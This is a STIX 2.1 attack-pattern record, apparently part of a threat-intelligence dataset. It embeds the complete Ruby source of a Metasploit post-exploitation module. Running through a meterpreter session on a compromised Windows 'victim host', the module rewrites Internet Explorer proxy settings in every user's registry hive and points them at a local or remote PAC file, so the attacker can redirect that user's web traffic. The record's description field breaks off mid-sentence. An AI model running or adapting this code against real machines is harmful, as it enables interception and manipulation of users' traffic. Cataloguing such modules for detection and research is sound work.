{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e3551059-695d-4d68-9469-42bd2879432a",
    "created": "2024-08-14T16:33:04.968148Z",
    "modified": "2024-08-14T16:33:04.968152Z",
    "name": "Windows Manage Proxy PAC File",
    "description": " This module configures Internet Explorer to use a PAC proxy file. By using the LOCAL_PAC option, a PAC file will be created on the victim host. It's also possible to provide a",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/ie_proxypac.rb",
            "external_id": "ie_proxypac.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.youtube.com/watch?v=YGjIlbBVDqE&hd=1"
        },
        {
            "source_name": "reference",
            "url": "http://blog.scriptmonkey.eu/bypassing-group-policy-using-the-windows-registry"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Priv\n  include Msf::Post::File\n  include Msf::Post::Windows::Registry\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Manage Proxy PAC File',\n        'Description' => %q{\n          This module configures Internet Explorer to use a PAC proxy file. By using the LOCAL_PAC\n          option, a PAC file will be created on the victim host. It's also possible to provide a\n          remote PAC file (REMOTE_PAC option) by providing the full URL.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Borja Merino <bmerinofe[at]gmail.com>'],\n        'References' => [\n          [ 'URL', 'https://www.youtube.com/watch?v=YGjIlbBVDqE&hd=1' ],\n          [ 'URL', 'http://blog.scriptmonkey.eu/bypassing-group-policy-using-the-windows-registry' ]\n        ],\n        'Platform' => 'win',\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_config_getenv\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptPath.new('LOCAL_PAC', [false, 'Local PAC file.' ]),\n        OptString.new('REMOTE_PAC', [false, 'Remote PAC file. (Ex: http://192.168.1.20/proxy.pac)' ]),\n        OptBool.new('DISABLE_PROXY', [true, 'Disable the proxy server.', false]),\n        OptBool.new('AUTO_DETECT', [true, 'Automatically detect settings.', false])\n      ]\n    )\n  end\n\n  def run\n    if datastore['LOCAL_PAC'].blank? && datastore['REMOTE_PAC'].blank?\n      print_error('You must set a remote or local PAC file. Aborting...')\n      return\n    end\n\n    if datastore['REMOTE_PAC']\n      @remote = true\n      print_status('Setting automatic configuration script from a remote PAC file ...')\n      res = enable_proxypac(datastore['REMOTE_PAC'])\n    else\n      @remote = false\n      print_status('Setting automatic configuration script from local PAC file ...')\n      pac_file = create_pac(datastore['LOCAL_PAC'])\n      unless pac_file\n        print_error('There were problems creating the PAC proxy file. Aborting...')\n        return\n      end\n      res = enable_proxypac(pac_file)\n    end\n    unless res\n      print_error('Error while setting an automatic configuration script. Aborting...')\n      return\n    end\n\n    print_good('Automatic configuration script configured...')\n\n    if datastore['AUTO_DETECT']\n      print_status('Enabling Automatically Detect Settings...')\n      unless auto_detect_on\n        print_error('Failed to enable Automatically Detect Settings. Proceeding anyway...')\n      end\n    end\n\n    if datastore['DISABLE_PROXY']\n      print_status('Disabling the Proxy Server...')\n      unless disable_proxy\n        print_error('Failed to disable Proxy Server. Proceeding anyway...')\n      end\n    end\n  end\n\n  def create_pac(local_pac)\n    pac_file = session.sys.config.getenv('APPDATA') << '\\\\' << Rex::Text.rand_text_alpha((rand(6..13))) << '.pac'\n    conf_pac = ''\n\n    if ::File.exist?(local_pac)\n      conf_pac << ::File.open(local_pac, 'rb').read\n    else\n      print_error('Local PAC file not found.')\n      return false\n    end\n\n    if write_file(pac_file, conf_pac)\n      print_status(\"PAC proxy configuration file written to #{pac_file}\")\n      return pac_file\n    else\n      return false\n    end\n  end\n\n  def enable_proxypac(pac)\n    proxy_pac_enabled = false\n\n    registry_enumkeys('HKU').each do |k|\n      next unless k.include? 'S-1-5-21'\n      next if k.include? '_Classes'\n\n      key = \"HKEY_USERS\\\\#{k}\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet\\ Settings\"\n      value_auto = 'AutoConfigURL'\n      file = @remote ? pac.to_s : \"file://#{pac}\"\n\n      begin\n        res = registry_setvaldata(key, value_auto, file, 'REG_SZ')\n      rescue ::RuntimeError, Rex::TimeoutError\n        next\n      end\n\n      if res.nil? # Rex::Post::Meterpreter::RequestError\n        next\n      end\n\n      if change_connection(16, '05', key + '\\\\Connections')\n        proxy_pac_enabled = true\n      end\n    end\n\n    if proxy_pac_enabled\n      return true\n    else\n      return false\n    end\n  end\n\n  def auto_detect_on\n    auto_detect_enabled = false\n\n    registry_enumkeys('HKU').each do |k|\n      next unless k.include? 'S-1-5-21'\n      next if k.include? '_Classes'\n\n      key = \"HKEY_USERS\\\\#{k}\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet\\ Settings\\\\Connections\"\n      if change_connection(16, '0D', key)\n        print_good('Automatically Detect Settings on.')\n        auto_detect_enabled = true\n      end\n    end\n\n    if auto_detect_enabled\n      return true\n    else\n      return false\n    end\n  end\n\n  def disable_proxy\n    value_enable = 'ProxyEnable'\n    profile = false\n\n    registry_enumkeys('HKU').each do |k|\n      next unless k.include? 'S-1-5-21'\n      next if k.include? '_Classes'\n\n      key = \"HKEY_USERS\\\\#{k}\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet\\ Settings\"\n      begin\n        registry_setvaldata(key, value_enable, 0, 'REG_DWORD')\n        profile = true\n      rescue ::RuntimeError, Rex::TimeoutError\n        next\n      end\n    end\n\n    if profile\n      print_good('Proxy disabled.')\n      return true\n    else\n      return false\n    end\n  end\n\n  def change_connection(offset, value, key)\n    value_default = 'DefaultConnectionSettings'\n    begin\n      value_con = registry_getvaldata(key, value_default)\n      binary_data = value_con.unpack('H*')[0]\n      binary_data[offset, 2] = value\n      registry_setvaldata(key, value_default, ['%x' % binary_data.to_i(16)].pack('H*'), 'REG_BINARY')\n    rescue ::RuntimeError, Rex::TimeoutError\n      return false\n    end\n\n    return true\n  end\nend\n",
    "x_mitre_contributors": [
        "[ Borja Merino <bmerinofe[at]gmail.com>]",
        ""
    ],
    "x_mitre_platforms": [
        "win'"
    ]
}